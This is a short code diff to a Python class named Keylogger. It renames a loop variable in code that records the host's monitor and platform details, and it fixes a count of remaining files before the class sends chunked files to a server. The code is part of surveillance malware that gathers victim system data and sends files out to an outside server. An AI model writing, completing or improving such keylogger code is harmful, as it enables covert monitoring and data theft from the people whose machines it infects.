@@ -74,16 +74,16 @@ class Keylogger:
             uname = platform.uname()
 
             file.write("Monitors:\n")
-            for m in get_monitors():
+            for monitor in get_monitors():
                 file.write((
-                        f"\tname: {m.name}\n"
-                        f"\tx: {m.x}\n"
-                        f"\ty: {m.y}\n"
-                        f"\twidth (pixel): {m.width}\n"
-                        f"\theight (pixel): {m.height}\n"
-                        f"\twidth (mm): {m.width_mm}\n"
-                        f"\theight (mm): {m.height_mm}\n"
-                        f"\tis primary?: {m.is_primary}\n\n"
+                        f"\tname: {monitor.name}\n"
+                        f"\tx: {monitor.x}\n"
+                        f"\ty: {monitor.y}\n"
+                        f"\twidth (pixel): {monitor.width}\n"
+                        f"\theight (pixel): {monitor.height}\n"
+                        f"\twidth (mm): {monitor.width_mm}\n"
+                        f"\theight (mm): {monitor.height_mm}\n"
+                        f"\tis primary?: {monitor.is_primary}\n\n"
                     ))
             file.write((
                         f"System: {uname.system}\n"
@@ -168,7 +168,7 @@ class Keylogger:
 
             number_of_chunks = str(len(chunks))
             filename = os.path.split(file)[1]
-            number_of_files_left = str(number_of_files-index)
+            number_of_files_left = str(number_of_files-index-1)
             
             self.send_header_to_server(number_of_chunks,filename,number_of_files_left)            
 
